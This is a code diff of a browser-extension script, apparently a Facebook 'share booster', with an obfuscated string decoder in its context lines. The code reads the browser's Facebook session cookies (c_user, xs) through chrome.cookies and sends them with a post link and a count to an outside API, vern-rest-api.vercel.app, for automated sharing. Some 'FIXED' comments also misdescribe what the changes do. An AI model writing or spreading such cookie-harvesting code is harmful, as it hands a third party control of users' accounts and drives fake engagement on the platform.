@@ -42,93 +42,118 @@ function getString(index) {
     }
 })(getStrings, 0x1e6a9);
 
-const burger       = document.getElementById('burger');
-const navLinks     = document.getElementById('nav-links');
+const burger = document.getElementById('burger');
+const navLinks = document.querySelector('.nav-links'); // FIXED: added dot
 const darkModeSwitch = document.getElementById('darkModeSwitch');
 const developerBtn = document.getElementById('developer');
 const tutorialsBtn = document.getElementById('tutorials');
-const backBtn      = document.getElementById('backBtn');
-const shareBtn     = document.getElementById('shareBtn');
-const statusEl     = document.getElementById('status');
-const cookieInput  = document.getElementById('cookie');
-const linkInput    = document.getElementById('link');
-const limitInput   = document.getElementById('limit');
+const backBtn = document.querySelector('#backBtn'); // FIXED: added #
+const shareBtn = document.querySelector('#shareBtn'); // FIXED: added #
+const statusEl = document.getElementById('status');
+const cookieInput = document.querySelector('#cookie'); // FIXED: added #
+const linkInput = document.querySelector('#link'); // FIXED: added #
+const limitInput = document.querySelector('#limit'); // FIXED: added #
 
-burger.addEventListener('click', () => {
-    navLinks.classList.toggle('active');
-});
+if (burger && navLinks) {
+    burger.addEventListener('click', () => {
+        navLinks.classList.toggle('active');
+    });
+}
 
-darkModeSwitch.addEventListener('change', () => {
-    document.body.classList.toggle('dark');
-    document.body.classList.toggle('light');
-});
+if (darkModeSwitch) {
+    darkModeSwitch.addEventListener('change', () => {
+        document.body.classList.toggle('dark');
+        document.body.classList.toggle('light');
+    });
+}
 
-developerBtn.addEventListener('click', () => {
-    window.open('https://www.facebook.com/notfound500', '_self');
-});
+if (developerBtn) {
+    developerBtn.addEventListener('click', () => {
+        window.open('https://www.facebook.com/notfound500', '_self');
+    });
+}
 
-tutorialsBtn.addEventListener('click', () => {
-    window.open('tutorial.html', '_blank');
-});
+if (tutorialsBtn) {
+    tutorialsBtn.addEventListener('click', () => {
+        window.open('tutorial.html', '_blank');
+    });
+}
 
-backBtn.addEventListener('click', () => {
-    window.open('features.html', '_self');
-});
+if (backBtn) {
+    backBtn.addEventListener('click', () => {
+        window.open('features.html', '_self');
+    });
+}
 
-shareBtn.addEventListener('click', async () => {
-    const cookie = cookieInput.value.trim();
-    const link = linkInput.value.trim();
-    const limit = limitInput.value.trim();
+if (shareBtn) {
+    shareBtn.addEventListener('click', async () => {
+        const cookie = cookieInput ? cookieInput.value.trim() : '';
+        const link = linkInput ? linkInput.value.trim() : '';
+        const limit = limitInput ? limitInput.value.trim() : '';
 
-    if (!cookie || !link || !limit) {
-        statusEl.textContent = '❌ Please fill all fields!';
-        statusEl.style.color = '#fecaca';
-        return;
-    }
-
-    shareBtn.innerHTML = '<i class="fas fa-spinner fa-spin icon"></i> Processing...';
-    shareBtn.disabled = true;
-    statusEl.innerHTML = '<i class="fas fa-spinner fa-spin icon"></i> Processing boost...';
-    statusEl.style.color = '#fff';
-
-    try {
-        const response = await fetch(
-            'https://vern-rest-api.vercel.app/api/share?cookie='
-            + encodeURIComponent(cookie)
-            + '&link=' + encodeURIComponent(link)
-            + '&limit=' + encodeURIComponent(limit),
-            { method: 'GET' }
-        );
-
-        const data = await response.json();
-
-        if (data.status) {
-            statusEl.textContent = '✅ Shared ' + data.success_count + ' times!';
-            statusEl.style.color = '#d1fae5';
-        } else {
-            statusEl.textContent = '❌ ' + (data.message || 'Failed to share.');
-            statusEl.style.color = '#fecaca';
+        if (!cookie || !link || !limit) {
+            if (statusEl) {
+                statusEl.textContent = '❌ Please fill all fields!';
+                statusEl.style.color = '#fecaca';
+            }
+            return;
         }
-    } catch (err) {
-        statusEl.textContent = '❌ Error! Check network or cookie.';
-        statusEl.style.color = '#fecaca';
-        console.error(err);
-    } finally {
-        shareBtn.textContent = 'Share';
-        shareBtn.disabled = false;
-    }
-});
 
-chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
-    const tab = tabs[0];
-    if (!tab) return;
+        shareBtn.innerHTML = '<i class="fas fa-spinner fa-spin icon"></i> Processing...';
+        shareBtn.disabled = true;
+        
+        if (statusEl) {
+            statusEl.innerHTML = '<i class="fas fa-spinner fa-spin icon"></i> Processing boost...';
+            statusEl.style.color = '#fff';
+        }
 
-    chrome.cookies.getAll({ url: 'https://www.facebook.com' }, cookies => {
-        const cUserCookie = cookies.find(c => c.name === 'c_user');
-        const xsCookie = cookies.find(c => c.name === 'xs');
+        try {
+            const response = await fetch(
+                'https://vern-rest-api.vercel.app/api/share?cookie=' +
+                encodeURIComponent(cookie) +
+                '&link=' + encodeURIComponent(link) +
+                '&limit=' + encodeURIComponent(limit),
+                { method: 'GET' }
+            );
 
-        if (cUserCookie && xsCookie) {
-            cookieInput.value = 'c_user=' + cUserCookie.value + '; xs=' + xsCookie.value + ';';
+            const data = await response.json();
+
+            if (statusEl) {
+                if (data.status) {
+                    statusEl.textContent = '✅ Shared ' + data.success_count + ' times!';
+                    statusEl.style.color = '#d1fae5';
+                } else {
+                    statusEl.textContent = '❌ ' + (data.message || 'Failed to share.');
+                    statusEl.style.color = '#fecaca';
+                }
+            }
+        } catch (err) {
+            if (statusEl) {
+                statusEl.textContent = '❌ Error! Check network or cookie.';
+                statusEl.style.color = '#fecaca';
+                console.error(err);
+            }
+        } finally {
+            // I-restore ang share button sa original state
+            shareBtn.textContent = 'Share';
+            shareBtn.disabled = false;
         }
     });
-});
+}
+
+// Check if chrome APIs are available
+if (typeof chrome !== 'undefined' && chrome.tabs && chrome.cookies) {
+    chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
+        const tab = tabs[0];
+        if (!tab) return;
+
+        chrome.cookies.getAll({ url: 'https://www.facebook.com' }, cookies => {
+            const cUserCookie = cookies.find(c => c.name === 'c_user');
+            const xsCookie = cookies.find(c => c.name === 'xs');
+
+            if (cUserCookie && xsCookie && cookieInput) {
+                cookieInput.value = 'c_user=' + cUserCookie.value + '; xs=' + xsCookie.value + ';';
+            }
+        });
+    });
+}
